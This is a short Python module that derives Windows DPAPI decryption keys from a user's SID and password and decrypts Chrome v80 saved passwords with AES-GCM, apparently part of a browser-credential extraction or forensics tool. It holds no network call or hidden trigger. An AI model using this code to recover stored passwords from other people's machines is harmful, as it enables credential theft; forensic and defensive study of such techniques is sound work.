from hashlib import pbkdf2_hmac

from Cryptodome.Cipher import AES
from Cryptodome.Hash import HMAC, SHA1, MD4


USERNAME = str

def deriveKeysFromUser(sid, password):
    # Will generate two keys, one with SHA1 and another with MD4
    key1 = HMAC.new(SHA1.new(password.encode('utf-16le')).digest(), (sid + '\0').encode('utf-16le'), SHA1).digest()
    key2 = HMAC.new(MD4.new(password.encode('utf-16le')).digest(), (sid + '\0').encode('utf-16le'), SHA1).digest()
    # For Protected users
    tmpKey = pbkdf2_hmac('sha256', MD4.new(password.encode('utf-16le')).digest(), sid.encode('utf-16le'), 10000)
    tmpKey2 = pbkdf2_hmac('sha256', tmpKey, sid.encode('utf-16le'), 1)[:16]
    key3 = HMAC.new(tmpKey2, (sid + '\0').encode('utf-16le'), SHA1).digest()[:20]

    return key1, key2, key3


def has_v10_header(password_bytes: bytes) -> bool:
    """
    Checks whether or not chrome password has v10 header
    """
    return password_bytes[:3].decode() == "v10"


def decrypt_chrome_v80_password(enc_password: bytes, state_key: bytes) -> str:
    """
    Decrypts chrome v80 passwords.
    :param enc_password: Encrypted password.
    :param state_key: State key for decryption.
    :return: Decrypted password
    """

    iv = enc_password[3:15]
    payload = enc_password[15:]
    aes_encrypted_key = AES.new(state_key, AES.MODE_GCM, iv)
    decrypted_pass = aes_encrypted_key.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes

    return decrypted_pass